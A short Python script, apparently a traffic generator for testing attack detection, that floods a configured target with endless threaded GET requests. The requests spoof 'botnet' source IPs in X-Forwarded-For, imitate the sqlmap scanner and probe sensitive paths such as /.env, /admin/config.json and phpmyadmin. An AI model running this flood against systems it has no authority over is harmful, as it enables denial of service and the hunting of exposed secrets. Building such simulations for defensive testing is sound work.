import random
import requests
import time
from concurrent.futures import ThreadPoolExecutor

from config import (
    TARGET_URL,
    REQUEST_TIMEOUT,
    SPIKE_WORKERS,
    SPIKE_REQUESTS_PER_BATCH,
)

BOTNET_IPS = [
    "185.220.101.5", "185.220.101.44", "185.220.102.78",
    "45.83.223.12", "103.21.244.15", "194.26.29.11"
]

ATTACK_PATHS = [
    "/admin/config.json", "/.env", "/api/v1/debug?dump=true",
    "/v2/auth/bypass", "/phpmyadmin/index.php"
]


def hit():
    try:
        ip = random.choice(BOTNET_IPS)
        path = random.choice(ATTACK_PATHS)
        headers = {"X-Forwarded-For": ip, "User-Agent": "sqlmap/1.7.11#stable"}
        url = f"{TARGET_URL.rstrip('/')}{path}"
        requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
    except:
        pass


print(f"Starting spike DDoS attack simulation with fake botnet IPs against {TARGET_URL}")

while True:
    with ThreadPoolExecutor(max_workers=SPIKE_WORKERS) as executor:
        for _ in range(SPIKE_REQUESTS_PER_BATCH):
            executor.submit(hit)
    print(f"[SPIKE] Sent batch of {SPIKE_REQUESTS_PER_BATCH} requests from botnet IPs")
    time.sleep(1)